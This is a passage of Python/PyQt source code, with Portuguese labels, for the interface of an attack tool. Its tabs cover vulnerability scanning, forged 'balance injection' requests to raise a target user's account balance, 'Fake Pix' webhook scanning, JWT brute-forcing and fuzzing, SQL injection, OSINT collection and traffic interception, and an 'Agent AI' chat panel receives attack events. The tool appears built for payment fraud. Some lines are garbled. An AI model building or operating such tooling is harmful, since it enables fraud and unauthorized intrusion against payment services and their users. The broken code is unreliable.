            suggestion_bubble = ChatBubble('Agent AI', suggestion_text, is_user=False)
            self.chat_content_layout.addWidget(suggestion_bubble, alignment=Qt.AlignLeft)
            self.chat_scroll.verticalScrollBar().setValue(self.chat_scroll.verticalScrollBar().maximum())

    def add_ai_suggestion_to_chat(self, suggestion_text):
        if suggestion_text:
            suggestion_bubble = ChatBubble('Agent AI', suggestion_text, is_user=False)
            self.chat_content_layout.addWidget(suggestion_bubble, alignment=Qt.AlignLeft)
            self.chat_scroll.verticalScrollBar().setValue(self.chat_scroll.verticalScrollBar().maximum()).addWidget(bubble, alignment=Qt.AlignLeft)
        # Rolagem automática
        self.chat_scroll.verticalScrollBar().setValue(self.chat_scroll.verticalScrollBar().maximum())

    def setup_target_scan_tab(self):
        """Setup the Scan tab with interactive terminal logs."""
        scan_tab = QWidget()
        layout = QVBoxLayout(scan_tab)
        # URL input
        h1 = QHBoxLayout()
        h1.addWidget(QLabel('Target URL:'))
        self.scan_url_entry = QLineEdit()
        h1.addWidget(self.scan_url_entry)
        layout.addLayout(h1)
        # Vulnerability types
        vuln_group = QGroupBox('Tipos de Vulnerabilidades')
        vuln_layout = QGridLayout(vuln_group)
        types = ['SQLi','XSS','CSRF','LFI','SSTI','IDOR','Path Traversal']
        self.scan_checks = {}
        for idx, t in enumerate(types):
            cb = QCheckBox(t)
            self.scan_checks[t] = cb
            vuln_layout.addWidget(cb, idx//4, idx%4)
        layout.addWidget(vuln_group)
        # Checkbox para Scan Pix / Webhooks
        self.chk_fakepix = QCheckBox('Scan Pix / Webhooks')
        self.scan_checks['Scan Pix / Webhooks'] = self.chk_fakepix
        vuln_layout.addWidget(self.chk_fakepix, (len(types)//4)+1, 0)
        # Botões de controle do Scan
        btn_layout = QHBoxLayout()
        self.scan_btn = QPushButton('Iniciar Varredura')
        self.stop_scan_btn = QPushButton('Parar Varredura')
        self.btn_usar_scan_fakepix = QPushButton('Usar Dados no Fake Pix')
        btn_layout.addWidget(self.scan_btn)
        btn_layout.addWidget(self.stop_scan_btn)
        btn_layout.addWidget(self.btn_usar_scan_fakepix)
        layout.addLayout(btn_layout)
        # Conectar botões
        self.scan_btn.clicked.connect(self.run_scan)
        self.stop_scan_btn.clicked.connect(self.stop_scan)
        self.btn_usar_scan_fakepix.clicked.connect(self.preencher_fakepix_com_scan)
        # Log console
        self.scan_log = QTextEdit()
        self.scan_log.setReadOnly(True)
        layout.addWidget(self.scan_log)
        # Add a progress bar for scan progress
        self.scan_progress = QProgressBar()
        self.scan_progress.setRange(0, 100)
        self.scan_progress.setValue(0)
        layout.addWidget(self.scan_progress)
        # Conecta sinais de log e progresso à GUI
        self.scan_log_signal.connect(self.scan_log.append)
        self.scan_progress_signal.connect(self.scan_progress.setValue)
        self.tabs.addTab(scan_tab, 'Scan')

    def run_scan(self):
        """Execute the vulnerability scan in a thread."""
        url = self.scan_url_entry.text().strip()
        if not url:
            QMessageBox.warning(self, 'Scan', 'Informe a URL alvo.')
            return
        # Optional: attempt DNS resolution but do not abort scan if it fails
        parsed = urllib.parse.urlparse(url)
        host = parsed.hostname
        try:
            socket.gethostbyname(host)
        except Exception as e:
            logging.warning(f"Não foi possível resolver domínio '{host}', prosseguindo com o scan: {e}")
            # Emit warning to scan log and continue
            self.scan_log_signal.emit(f"[! Warning] Não foi possível resolver domínio '{host}', prosseguindo com o scan: {e}")
        options = [t for t, cb in self.scan_checks.items() if cb.isChecked()]
        self.scan_log.clear()
        # Reset scan progress bar
        self.scan_progress.setValue(0)
        # Preparar controle de abort
        self._scan_abort.clear()
        self.stop_scan_btn.setEnabled(True)
        self.scan_btn.setText('Executando...')
        self.scan_btn.setEnabled(False)
        threading.Thread(target=lambda: self._do_scan(url, options), daemon=True).start()

    def _do_scan(self, url, options):
        from modules.scan_target import TargetScanner
        # callbacks para logs e progresso
        def log_cb(msg):
            self.scan_log_signal.emit(msg)
        def progress_cb(val):
            self.scan_progress_signal.emit(val)
        # executar varredura avançada com callbacks
        try:
            scanner = TargetScanner(url)
            scanner.scan(log_callback=log_cb, progress_callback=progress_cb, abort_event=self._scan_abort)
            # Se solicitado, gerar cache para Fake Pix/Webhooks
            if 'Scan Pix / Webhooks' in options:
                try:
                    import os
                    from modules.scan_engine import run_full_scan
                    os.makedirs('output', exist_ok=True)
                    run_full_scan(url, options, dry_run=False)
                    log_cb('Cache FakePix gerado em output/fakepix_scan_cache.json')
                except Exception as e:
                    log_cb(f'[!] Falha ao gerar cache FakePix: {e}')
        except Exception as e:
            self.scan_log_signal.emit(f"Erro no escaneamento: {e}")
        finally:
            # restaurar botões ao finalizar
            def finish():
                self.scan_btn.setText('Iniciar Varredura')
                self.scan_btn.setEnabled(True)
                self.stop_scan_btn.setEnabled(False)
            QTimer.singleShot(0, finish)

    def stop_scan(self):
        """Stop the ongoing scan"""
        self._scan_abort.set()
        self.stop_scan_btn.setEnabled(False)
        self.scan_btn.setEnabled(True)
        self.scan_btn.setText('Iniciar Varredura')
        self.scan_log_signal.emit('Varredura interrompido pelo usuário')

    def setup_balance_injection_tab(self):
        """Setup the Balance Injection tab with user select, request builder, and execution logs."""
        bal_tab = QWidget()
        main_layout = QVBoxLayout(bal_tab)
        # Group 1: Seleção do usuário alvo
        user_group = QGroupBox('Seleção do Usuário Alvo')
        ug_layout = QHBoxLayout(user_group)
        ug_layout.addWidget(QLabel('ID ou Nome:'))
        self.balance_user_entry = QLineEdit()
        ug_layout.addWidget(self.balance_user_entry)
        main_layout.addWidget(user_group)
        # Group 2: Construção da requisição
        req_group = QGroupBox('Construção da Requisição')
        req_layout = QFormLayout(req_group)
        self.balance_endpoint_entry = QLineEdit()
        req_layout.addRow('Endpoint:', self.balance_endpoint_entry)
        self.balance_headers_edit = QTextEdit()
        self.balance_headers_edit.setPlainText('{}')
        req_layout.addRow('Headers (JSON):', self.balance_headers_edit)
        self.balance_body_edit = QTextEdit()
        self.balance_body_edit.setPlainText('{"balance": 10000}')
        req_layout.addRow('Corpo (JSON):', self.balance_body_edit)
        self.balance_auth_combo = QComboBox()
        self.balance_auth_combo.addItems(['JWT','Bearer','Cookie'])
        req_layout.addRow('Autenticação:', self.balance_auth_combo)
        main_layout.addWidget(req_group)
        # Group 3: Execução
        exec_group = QGroupBox('Execução')
        exec_layout = QVBoxLayout(exec_group)
        self.balance_exec_btn = QPushButton('Executar Requisição')
        self.balance_exec_btn.clicked.connect(self.run_balance_request)
        exec_layout.addWidget(self.balance_exec_btn)
        self.balance_log = QTextEdit()
        self.balance_log.setReadOnly(True)
        exec_layout.addWidget(self.balance_log)
        main_layout.addWidget(exec_group)
        self.tabs.addTab(bal_tab, 'Balance')
        # Botão parar Balance Injection
        self.balance_stop_btn = QPushButton('Parar Requisição')
        self.balance_stop_btn.setEnabled(False)
        self.balance_stop_btn.clicked.connect(self.stop_balance)
        exec_layout.addWidget(self.balance_stop_btn)

    def run_balance_request(self):
        """Execute forged balance request in a background thread."""
        endpoint = self.balance_endpoint_entry.text().strip()
        if not endpoint:
            QMessageBox.warning(self, 'Balance', 'Informe o endpoint.')
            return
        headers_text = self.balance_headers_edit.toPlainText()
        body_text = self.balance_body_edit.toPlainText()
        auth_type = self.balance_auth_combo.currentText()
        self.balance_log.clear()
        # prepara abort e UI
        self._balance_abort.clear()
        self.balance_exec_btn.setText('Executando...')
        self.balance_exec_btn.setEnabled(False)
        self.balance_stop_btn.setEnabled(True)
        threading.Thread(target=lambda: self._do_balance_request(endpoint, headers_text, body_text, auth_type), daemon=True).start()

    def _do_balance_request(self, endpoint, headers_text, body_text, auth_type):
        from core.balance_injector import send_forged_balance_request
        def log_cb(msg):
            now = datetime.now().strftime('%H:%M:%S')
            QTimer.singleShot(0, lambda: self.balance_log.append(f'[{now}] {msg}'))
        def result_cb(response):
            def finish(res):
                if res is None:
                    self.balance_log.append('Falha na requisição.')
                else:
                    self.balance_log.append(f'Status code: {res.status_code}\n{res.text}')
                self.balance_exec_btn.setText('Executar Requisição')
            QTimer.singleShot(0, lambda: finish(response))
        send_forged_balance_request(endpoint, headers_text, body_text, auth_type, log_cb, result_cb)
    def stop_balance(self):
        """Abort balance request"""
        self._balance_abort.set()
        self.balance_log.append('Requisição interrompida pelo usuário')
        self.balance_stop_btn.setEnabled(False)
        self.balance_exec_btn.setEnabled(True)

    def setup_manual_attack_tab(self):
        """Setup the Manual Attack tab with multiple attack options and dynamic panels."""
        man_tab = QWidget()
        layout = QVBoxLayout(man_tab)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(10)
        # Parâmetros do Ataque
        param_group = QGroupBox('Parâmetros do Ataque')
        form = QFormLayout(param_group)
        types = ['Selecione o tipo de ataque', 'Bruteforce JWT', 'Fuzz JWT', 'Descriptografar JWT',
                 'Descriptografar AES', 'Injeção SQL', 'Injeção de Saldo',
                 'Geração de Wordlist', 'Análise Cripto', 'Varredura de Alvo', 'Coleta OSINT']
        self.attack_type_combo = QComboBox()
        self.attack_type_combo.addItems(types)
        form.addRow('Attack Type:', self.attack_type_combo)
        layout.addWidget(param_group)
        # Stacked widget para cada ataque
        self.manual_stack = QStackedWidget()
        # Página 0: instruções
        page0 = QWidget(); p0 = QVBoxLayout(page0)
        p0.addWidget(QLabel('Selecione um tipo de ataque acima.'), alignment=Qt.AlignCenter)
        self.manual_stack.addWidget(page0)
        # Página 1: Bruteforce JWT
        page1 = QWidget(); bf = QFormLayout(page1)
        self.manual_brute_token = QLineEdit(); bf.addRow('Token JWT:', self.manual_brute_token)
        wl_h = QHBoxLayout(); self.manual_brute_wordlist = QLineEdit();
        wl_btn = QPushButton('📂'); wl_btn.clicked.connect(lambda: self.manual_brute_wordlist.setText(QFileDialog.getOpenFileName(self, 'Selecione Wordlist', '', 'All Files (*)')[0]));
        wl_h.addWidget(self.manual_brute_wordlist); wl_h.addWidget(wl_btn)
        bf.addRow('Wordlist:', wl_h)
        self.manual_brute_algo = QComboBox(); self.manual_brute_algo.addItems(['HS256','HS384','HS512']); bf.addRow('Algoritmo:', self.manual_brute_algo)
        self.manual_stack.addWidget(page1)
        # Página 2: Fuzz JWT
        page2 = QWidget(); fz = QFormLayout(page2)
        self.manual_fuzz_endpoint = QLineEdit(); fz.addRow('Endpoint:', self.manual_fuzz_endpoint)
        self.manual_fuzz_input = QTextEdit(); fz.addRow('Dados (JSON):', self.manual_fuzz_input)
        self.manual_fuzz_type = QComboBox(); self.manual_fuzz_type.addItems(['Wordlist-based','Mutational','Coverage-guided']); fz.addRow('Tipo:', self.manual_fuzz_type)
        self.manual_fuzz_template = QComboBox(); self.manual_fuzz_template.addItems(['template1','template2','template3']); fz.addRow('Template:', self.manual_fuzz_template)
        self.manual_stack.addWidget(page2)
        # Página 3: Descriptografar JWT
        page3 = QWidget()
        f3 = QFormLayout(page3)
        self.manual_decode_token = QLineEdit()
        self.manual_decode_token.setPlaceholderText('JWT Token')
        f3.addRow('Token JWT:', self.manual_decode_token)
        self.manual_decode_algo = QComboBox()
        self.manual_decode_algo.addItems(['HS256','HS384','HS512','RS256','RS384','RS512'])
        f3.addRow('Algoritmo:', self.manual_decode_algo)
        self.manual_decode_key = QLineEdit()
        self.manual_decode_key.setEchoMode(QLineEdit.Password)
        f3.addRow('Chave Secreta/Pública:', self.manual_decode_key)
        decode_btn = QPushButton('Decodificar JWT')
        decode_btn.clicked.connect(lambda: self.manual_output.append(f'Decodificando JWT: {self.manual_decode_token.text().strip()}'))
        f3.addRow(decode_btn)
        self.manual_stack.addWidget(page3)
        # Página 4: Descriptografar AES
        page4 = QWidget()
        f4 = QFormLayout(page4)
        self.manual_aes_ciphertext = QTextEdit()
        self.manual_aes_ciphertext.setPlaceholderText('Ciphertext (Base64)')
        f4.addRow('Ciphertext:', self.manual_aes_ciphertext)
        self.manual_aes_key = QLineEdit()
        self.manual_aes_key.setEchoMode(QLineEdit.Password)
        f4.addRow('Chave Secreta:', self.manual_aes_key)
        self.manual_aes_mode = QComboBox()
        self.manual_aes_mode.addItems(list(MODES.keys()))
        f4.addRow('Modo:', self.manual_aes_mode)
        self.manual_aes_iv = QLineEdit()
        self.manual_aes_iv.setPlaceholderText('IV (Base64)')
        f4.addRow('IV:', self.manual_aes_iv)
        aes_btn = QPushButton('Descriptografar AES')
        aes_btn.clicked.connect(lambda: self.manual_output.append('Descriptografando AES...'))
        f4.addRow(aes_btn)
        self.manual_stack.addWidget(page4)
        # Página 5: Injeção SQL
        page5 = QWidget()
        f5 = QFormLayout(page5)
        self.manual_sql_endpoint = QLineEdit()
        f5.addRow('Endpoint:', self.manual_sql_endpoint)
        self.manual_sql_method = QComboBox()
        self.manual_sql_method.addItems(['GET','POST'])
        f5.addRow('Método HTTP:', self.manual_sql_method)
        self.manual_sql_param = QLineEdit()
        self.manual_sql_param.setPlaceholderText('Nome do parâmetro')
        f5.addRow('Parâmetro:', self.manual_sql_param)
        self.manual_sql_payload = QTextEdit()
        self.manual_sql_payload.setPlaceholderText('Payload SQL')
        f5.addRow('Payload:', self.manual_sql_payload)
        sql_btn = QPushButton('Testar Injeção SQL')
        sql_btn.clicked.connect(lambda: self.manual_output.append(f'Testando SQLi em {self.manual_sql_endpoint.text().strip()}'))
        f5.addRow(sql_btn)
        self.manual_stack.addWidget(page5)
        # Página 6: Injeção de Saldo
        page6 = QWidget()
        f6 = QFormLayout(page6)
        self.manual_balance_endpoint = QLineEdit()
        f6.addRow('Endpoint:', self.manual_balance_endpoint)
        self.manual_balance_headers = QTextEdit()
        f6.addRow('Headers (JSON):', self.manual_balance_headers)
        self.manual_balance_body = QTextEdit()
        f6.addRow('Body (JSON):', self.manual_balance_body)
        self.manual_balance_auth = QComboBox()
        self.manual_balance_auth.addItems(['JWT','Bearer','Cookie'])
        f6.addRow('Autenticação:', self.manual_balance_auth)
        balance_btn = QPushButton('Executar Injeção de Saldo')
        balance_btn.clicked.connect(lambda: self.manual_output.append('Executando Injeção de Saldo...'))
        f6.addRow(balance_btn)
        self.manual_stack.addWidget(page6)
        # Página 7: Geração de Wordlist
        page7 = QWidget()
        l7 = QVBoxLayout(page7)
        self.manual_wl_radio_reuse = QRadioButton('Reutilizar OSINT')
        self.manual_wl_radio_new = QRadioButton('Novo Scraping OSINT')
        self.manual_wl_radio_reuse.setChecked(True)
        rb7 = QHBoxLayout()
        rb7.addWidget(self.manual_wl_radio_reuse)
        rb7.addWidget(self.manual_wl_radio_new)
        l7.addLayout(rb7)
        self.manual_wl_emails = QCheckBox('Emails')
        self.manual_wl_domains = QCheckBox('Domínios')
        self.manual_wl_usernames = QCheckBox('Usernames')
        for cb in [self.manual_wl_emails, self.manual_wl_domains, self.manual_wl_usernames]:
            cb.setChecked(True)
            l7.addWidget(cb)
        adv7 = QHBoxLayout()
        adv7.addWidget(QLabel('Min Length:'))
        self.manual_wl_min = QSpinBox()
        adv7.addWidget(self.manual_wl_min)
        adv7.addWidget(QLabel('Max Length:'))
        self.manual_wl_max = QSpinBox()
        adv7.addWidget(self.manual_wl_max)
        l7.addLayout(adv7)
        wl_btn2 = QPushButton('Gerar Wordlist')
        wl_btn2.clicked.connect(lambda: self.manual_output.append('Gerando Wordlist...'))
        l7.addWidget(wl_btn2)
        self.manual_stack.addWidget(page7)
        # Página 8: Análise Cripto
        page8 = QWidget()
        f8 = QFormLayout(page8)
        self.manual_crypto_input = QLineEdit()
        f8.addRow('Dados:', self.manual_crypto_input)
        self.manual_crypto_operation = QComboBox()
        self.manual_crypto_operation.addItems(['Encrypt AES','Decrypt AES','Hash SHA256','Hash SHA512','Hash MD5'])
        f8.addRow('Operação:', self.manual_crypto_operation)
        self.manual_crypto_key = QLineEdit()
        self.manual_crypto_key.setEchoMode(QLineEdit.Password)
        f8.addRow('Chave:', self.manual_crypto_key)
        self.manual_crypto_mode = QComboBox()
        self.manual_crypto_mode.addItems(list(MODES.keys()))
        f8.addRow('Modo:', self.manual_crypto_mode)
        self.manual_crypto_iv = QLineEdit()
        f8.addRow('IV (Base64):', self.manual_crypto_iv)
        crypto_btn2 = QPushButton('Executar Crypto')
        crypto_btn2.clicked.connect(lambda: self.manual_output.append(f'Executando Crypto: {self.manual_crypto_operation.currentText()}'))
        f8.addRow(crypto_btn2)
        self.manual_stack.addWidget(page8)
        # Página 9: Varredura de Alvo
        page9 = QWidget()
        f9 = QFormLayout(page9)
        self.manual_scan_url = QLineEdit()
        f9.addRow('Target URL:', self.manual_scan_url)
        scan_widget = QWidget()
        scan_grid = QGridLayout(scan_widget)
        for idx, t in enumerate(['SQLi','XSS','CSRF','LFI','SSTI','IDOR','Path Traversal']):
            cb9 = QCheckBox(t)
            scan_grid.addWidget(cb9, idx//4, idx%4)
        f9.addRow('Tipos:', scan_widget)
        scan_btn2 = QPushButton('Iniciar Varredura')
        scan_btn2.clicked.connect(lambda: self.manual_output.append(f'Varredura em {self.manual_scan_url.text().strip()}'))
        f9.addRow(scan_btn2)
        self.manual_stack.addWidget(page9)
        # Página 10: Coleta OSINT
        page10 = QWidget()
        f10 = QFormLayout(page10)
        self.manual_osint_target = QLineEdit()
        f10.addRow('Alvo:', self.manual_osint_target)
        osint_btn2 = QPushButton('Executar OSINT')
        osint_btn2.clicked.connect(lambda: self.manual_output.append(f'Iniciando OSINT em {self.manual_osint_target.text().strip()}'))
        f10.addRow(osint_btn2)
        self.manual_stack.addWidget(page10)
        layout.addWidget(self.manual_stack)
        # Botões de ação
        btn_h = QHBoxLayout()
        self.manual_attack_btn = QPushButton('Executar Ataque')
        self.manual_attack_btn.clicked.connect(self.run_manual_attack)
        self.stop_manual_btn = QPushButton('Parar Ataque')
        self.stop_manual_btn.setEnabled(False)
        self.stop_manual_btn.clicked.connect(self.stop_manual)
        self.clear_manual_btn = QPushButton('Limpar Resultados')
        self.clear_manual_btn.clicked.connect(self.clear_manual_results)
        btn_h.addWidget(self.manual_attack_btn)
        btn_h.addWidget(self.stop_manual_btn)
        btn_h.addWidget(self.clear_manual_btn)
        layout.addLayout(btn_h)
        # Saída
        self.manual_output = QTextEdit(); self.manual_output.setReadOnly(True); self.manual_output.setFont(QFont('Courier New',10))
        layout.addWidget(self.manual_output)
        # Atualiza painel ao trocar tipo
        self.attack_type_combo.currentIndexChanged.connect(self.manual_stack.setCurrentIndex)
        self.tabs.addTab(man_tab, 'Manual')

    def update_manual_panel(self, idx):
        # idx 0 = placeholder, idx 1 = Bruteforce, idx 2 = Fuzz, etc
        self.manual_stack.setCurrentIndex(idx)

    def clear_manual_results(self):
        """Clear manual attack output"""
        self.manual_output.clear()

    def run_manual_attack(self):
        """Execute manual attack based on selected type"""
        attack_type = self.attack_type_combo.currentText()
        token = self.manual_url.text().strip()
        if attack_type == 'Selecione o tipo de ataque' or not token:
            return
        # Push manual attack event to AI worker
        self.ai_worker.push_event(f"Executed manual attack: type {attack_type} on {token}")
        self.manual_attack_btn.setText('Executando...')
        self.manual_output.clear()
        self._manual_abort.clear()
        self.manual_attack_btn.setEnabled(False)
        self.stop_manual_btn.setEnabled(True)
        threading.Thread(target=self._do_manual, args=(attack_type, token), daemon=True).start()
    def finish_manual(self):
        """Restore Manual Attack controls after finish"""
        self.manual_attack_btn.setEnabled(True)
        self.stop_manual_btn.setEnabled(False)
        self.manual_attack_btn.setText('Executar Ataque')
    def stop_manual(self):
        """Abort manual attack"""
        self._manual_abort.set()
        self.manual_output.append('Ataque manual cancelado pelo usuário')
        self.stop_manual_btn.setEnabled(False)
        self.manual_attack_btn.setEnabled(True)

    def setup_fuzzing_tab(self):
        """Setup Fuzzing tab with modern fuzzing techniques and live interactivity"""
        fuzz_tab = QWidget()
        layout = QVBoxLayout(fuzz_tab)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(10)
        # Seção: Endpoint e Dados
        ep_group = QGroupBox('Endpoint e Dados')
        ep_layout = QFormLayout(ep_group)
        self.fuzz_endpoint_entry = QLineEdit()
        self.fuzz_endpoint_entry.setPlaceholderText('https://exemplo.com/api')
        ep_layout.addRow('Endpoint:', self.fuzz_endpoint_entry)
        self.fuzz_input = QTextEdit()
        self.fuzz_input.setPlaceholderText('Headers/Body (JSON ou texto livre)')
        ep_layout.addRow('Headers/Body:', self.fuzz_input)
        layout.addWidget(ep_group)
        # Seção: Tipo de Fuzzing
        type_group = QGroupBox('Tipo de Fuzzing')
        type_layout = QHBoxLayout(type_group)
        self.fuzz_type_combo = QComboBox()
        self.fuzz_type_combo.addItems([
            'Wordlist-based', 'Mutational Fuzzing', 'Payload Templates',
            'Coverage-Guided', 'JWT Fuzzing', 'Custom Parameter Injection'
        ])
        type_layout.addWidget(self.fuzz_type_combo)
        layout.addWidget(type_group)
        # Seção: Payload Template
        tmpl_group = QGroupBox('Payload Template')
        tmpl_layout = QHBoxLayout(tmpl_group)
        self.fuzz_template_combo = QComboBox()
        payload_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'payloads'))
        for ext in ('*.json', '*.yaml', '*.txt'):
            for f in glob.glob(os.path.join(payload_dir, ext)):
                self.fuzz_template_combo.addItem(os.path.basename(f))
        tmpl_layout.addWidget(self.fuzz_template_combo)
        load_btn = QPushButton('📂')
        load_btn.setToolTip('Carregar template de payload')
        load_btn.clicked.connect(lambda:
            self.fuzz_template_combo.addItem(
                os.path.basename(QFileDialog.getOpenFileName(
                    self, 'Open Template', payload_dir, '(*.json *.yaml *.txt)'
                )[0])
            )
        )
        tmpl_layout.addWidget(load_btn)
        layout.addWidget(tmpl_group)
        # Seção: Execução
        exec_group = QGroupBox('Execução')
        exec_layout = QHBoxLayout(exec_group)
        self.fuzz_start_btn = QPushButton('Iniciar Fuzzing')
        self.fuzz_start_btn.clicked.connect(self.run_fuzz)
        self.fuzz_stop_btn = QPushButton('Parar Fuzzing')
        self.fuzz_stop_btn.setEnabled(False)
        self.fuzz_stop_btn.clicked.connect(self.stop_fuzz)
        exec_layout.addWidget(self.fuzz_start_btn)
        exec_layout.addWidget(self.fuzz_stop_btn)
        layout.addWidget(exec_group)
        # Progresso e Logs
        self.fuzz_progress = QProgressBar()
        layout.addWidget(self.fuzz_progress)
        self.fuzz_log = QTextEdit()
        self.fuzz_log.setReadOnly(True)
        self.fuzz_log.setFont(QFont('Courier New', 10))
        layout.addWidget(self.fuzz_log)
        view_btn = QPushButton('Visualizar Últimos Logs')
        view_btn.setToolTip('Exibe logs salvos em output/fuzzing_logs/')
        view_btn.clicked.connect(self.view_fuzz_logs)
        layout.addWidget(view_btn)
        self.tabs.addTab(fuzz_tab, 'Fuzzing')

    def run_fuzz(self):
        """Start advanced fuzzing with live logs and progress"""
        endpoint = self.fuzz_endpoint_entry.text().strip()
        if not endpoint:
            QMessageBox.warning(self, 'Fuzzing', 'Informe o endpoint alvo.')
            return
        headers_body = self.fuzz_input.toPlainText()
        fuzz_type = self.fuzz_type_combo.currentText()
        template = self.fuzz_template_combo.currentText()
        # Preparar UI
        self._fuzz_abort.clear()
        self.fuzz_progress.setValue(0)
        self.fuzz_log.clear()
        self.fuzz_start_btn.setEnabled(False)
        self.fuzz_stop_btn.setEnabled(True)
        # Executar em thread
        threading.Thread(target=lambda: self._do_fuzz(endpoint, headers_body, fuzz_type, template), daemon=True).start()
        # Feedback to user
        self.fuzz_log.append('Fuzzing iniciado em segundo plano...')

    def stop_fuzz(self):
        """Abort fuzzing process"""
        self._fuzz_abort.set()
        QTimer.singleShot(0, lambda: self.fuzz_log.append('Fuzzing cancelado pelo usuário'))
        self.fuzz_stop_btn.setEnabled(False)
        self.fuzz_start_btn.setEnabled(True)

    def _do_fuzz(self, endpoint, headers_body, fuzz_type, template):
        """Internal: executes run_advanced_fuzzing with callbacks and saves logs"""
        QTimer.singleShot(0, lambda: self.fuzz_log.append('[DEBUG] _do_fuzz started'))
        try:
            logs_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'output', 'fuzzing_logs'))
            os.makedirs(logs_dir, exist_ok=True)
            logfile = os.path.join(logs_dir, f"fuzz_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
            with open(logfile, 'w', encoding='utf-8') as lf:
                def log_cb(msg, color=None):
                    ts = datetime.now().strftime('%H:%M:%S')
                    entry = f'[{ts}] {msg}'
                    lf.write(entry + '\n'); lf.flush()
                    QTimer.singleShot(0, lambda: self.fuzz_log.append(entry))
                def progress_cb(val):
                    QTimer.singleShot(0, lambda: self.fuzz_progress.setValue(val))
                QTimer.singleShot(0, lambda: self.fuzz_log.append('[DEBUG] Chamando run_advanced_fuzzing...'))
                try:
                    run_advanced_fuzzing(endpoint, headers_body, fuzz_type, template, log_cb, progress_cb, self._fuzz_abort)
                except Exception as e:
                    log_cb(f'Erro no fuzzing: {e}')
                QTimer.singleShot(0, lambda: self.fuzz_log.append('[DEBUG] run_advanced_fuzzing retornou'))
        except Exception as e:
            QTimer.singleShot(0, lambda: self.fuzz_log.append(f'[DEBUG-ERROR] _do_fuzz exception: {e}'))
        finally:
            QTimer.singleShot(0, lambda: (self.fuzz_start_btn.setEnabled(True), self.fuzz_stop_btn.setEnabled(False), self.fuzz_log.append('Fuzzing finalizado.')))

    def view_fuzz_logs(self):
        """Exibe logs anteriores de fuzzing"""
        logs_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'output', 'fuzzing_logs'))
        files, _ = QFileDialog.getOpenFileNames(self, 'Visualizar Logs', logs_dir, 'Log Files (*.log)')
        for f in files:
            try:
                with open(f, encoding='utf-8') as rf:
                    content = rf.read()
                self.fuzz_log.append(f'--- Conteúdo de {os.path.basename(f)} ---')
                self.fuzz_log.append(content)
            except Exception as e:
                self.fuzz_log.append(f'Erro ao ler {f}: {e}')

    def setup_sql_tab(self):
        """Setup SQLi tab with automatic interception and suggestions."""
        sql_tab = QWidget()
        layout = QVBoxLayout(sql_tab)
        # URL input
        h_url = QHBoxLayout()
        h_url.addWidget(QLabel('Target URL:'))
        self.sqli_url_entry = QLineEdit()
        h_url.addWidget(self.sqli_url_entry)
        layout.addLayout(h_url)
        # Intercept tool selection
        h_tool = QHBoxLayout()
        h_tool.addWidget(QLabel('Intercept Tool:'))
        self.sqli_tool_combo = QComboBox()
        self.sqli_tool_combo.addItems(['Selenium','Burp Suite API'])
        h_tool.addWidget(self.sqli_tool_combo)
        self.sqli_btn = QPushButton('Iniciar Interceptação')
        self.sqli_btn.clicked.connect(self.run_sqli_intercept)
        h_tool.addWidget(self.sqli_btn)
        layout.addLayout(h_tool)
        # Painel de configurações por ferramenta
        self.sqli_stack = QStackedWidget()
        # Página 0: placeholder
        page0 = QLabel('Selecione a ferramenta de interceptação acima')
        page0.setAlignment(Qt.AlignCenter)
        self.sqli_stack.addWidget(page0)
        # Página 1: Selenium (com tabela de fluxos e controles avançados)
        page1 = QWidget()
        v1 = QVBoxLayout(page1)
        # Configurações Selenium
        form1 = QFormLayout()
        self.selenium_browser_combo = QComboBox(); self.selenium_browser_combo.addItems(['Chrome','Firefox','Edge'])
        form1.addRow('Browser:', self.selenium_browser_combo)
        self.selenium_driver_path = QLineEdit()
        browse_selenium_btn = QPushButton('📂')
        browse_selenium_btn.clicked.connect(lambda: self.selenium_driver_path.setText(QFileDialog.getOpenFileName(self, 'Select Driver', '', 'Executáveis (*.exe)')[0]))
        form1.addRow('Driver path:', self.selenium_driver_path); form1.addRow(browse_selenium_btn)
        self.selenium_headless_cb = QCheckBox('Headless'); form1.addRow(self.selenium_headless_cb)
        v1.addLayout(form1)
        # Fluxos capturados
        group_s = QGroupBox('Fluxos Selenium')
        gs_layout = QVBoxLayout(group_s)
        self.selenium_flows_table = QTableWidget(0, 4)
        self.selenium_flows_table.setHorizontalHeaderLabels(['ID','Method','URL','Status'])
        # Allow table to expand and show scrollbars
        self.selenium_flows_table.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        self.selenium_flows_table.setVerticalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        self.selenium_flows_table.setHorizontalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        # Wrap in scroll area for full view
        scroll_table = QScrollArea()
        scroll_table.setWidgetResizable(True)
        scroll_table.setWidget(self.selenium_flows_table)
        # Ensure at least ~10 rows visible without internal scrolling
        scroll_table.setMinimumHeight(350)
        gs_layout.addWidget(scroll_table)
        # Add group with stretch to fill available space
        v1.addWidget(group_s, 1)
        # Botões de controle
        h_sc = QHBoxLayout()
        self.selenium_update_btn = QPushButton('Atualizar Fluxos')
        self.selenium_update_btn.clicked.connect(self.update_selenium_flows)
        h_sc.addWidget(self.selenium_update_btn)
        self.selenium_reload_btn = QPushButton('Recarregar Página')
        self.selenium_reload_btn.clicked.connect(self.reload_selenium_page)
        h_sc.addWidget(self.selenium_reload_btn)
        self.selenium_export_btn = QPushButton('Exportar HAR')
        self.selenium_export_btn.clicked.connect(self.export_selenium_har)
        h_sc.addWidget(self.selenium_export_btn)
        v1.addLayout(h_sc)
        # Navegação avançada Selenium
        h_nav = QHBoxLayout()
        self.selenium_back_btn = QPushButton('Voltar')
        self.selenium_back_btn.clicked.connect(lambda: self.current_interceptor.go_back(log_callback=lambda m: self.sqli_log.append(f'[Selenium] {m}')))
        h_nav.addWidget(self.selenium_back_btn)
        self.selenium_forward_btn = QPushButton('Avançar')
        self.selenium_forward_btn.clicked.connect(lambda: self.current_interceptor.go_forward(log_callback=lambda m: self.sqli_log.append(f'[Selenium] {m}')))
        h_nav.addWidget(self.selenium_forward_btn)
        self.selenium_title_btn = QPushButton('Título da Página')
        self.selenium_title_btn.clicked.connect(lambda: self.sqli_log.append(self.current_interceptor.get_title(log_callback=lambda m: None) or ''))
        h_nav.addWidget(self.selenium_title_btn)
        self.selenium_screenshot_btn = QPushButton('Screenshot')
        self.selenium_screenshot_btn.clicked.connect(self.capture_selenium_screenshot)
